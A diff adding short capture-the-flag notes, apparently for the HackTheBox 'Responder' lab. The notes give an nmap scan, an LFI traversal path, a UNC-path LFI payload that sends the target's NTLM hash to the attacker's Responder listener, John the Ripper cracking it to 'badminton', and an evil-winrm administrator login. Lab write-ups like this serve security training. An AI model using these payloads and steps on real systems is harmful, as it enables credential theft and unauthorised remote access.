@@ -1,0 +1,46 @@
+SEQUEL:
+----------------
+
+respomder - LFI - RCE - RAC
+
+1- nmap:
+----------------
+	sudo nmap -p- --open -sS -vvv --min-rate 5000 -vvv -n -Pn 10.129.14.110 -oG nmap.txt -> ports
+	-
+	open ports 80 - 5985 - 7680
+
+2- /etc/hosts:
+----------------
+	Add 10.129.47.121 unika.htb
+	
+3- page:
+----------------
+	We can see http://unika.htb/index.php?page=german.html. 
+	1 param = page
+
+	
+4- Local File Include (LFI):
+----------------
+	We can use ../../../../../../../../windows/system32/drivers/etc/hosts
+	
+5- Responder:
+----------------
+	-i -> 	specify the network interface
+	a. responder -I tun0 -w -r -f
+	b. Use LFI and see password in Responder.
+	c. ifconfig -> inet:10.10.16.97
+	d. http://unika.htb/index.php?page=//10.10.16.97/somefile
+	e. Responder -> cracked password
+
+5- John the ripper:
+----------------
+	-w -> read words from FILE or stdin
+	Use -> john -w=/usr/share/wordlists/rockyou.txt cracked.txt
+	We can see password -> badminton 
+
+6- evil-winrm:
+----------------
+	sudo gem install evil-winrm
+	evil-winrm -i 10.129.136.91 -u administrator -p badminton
+	- *Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
+	
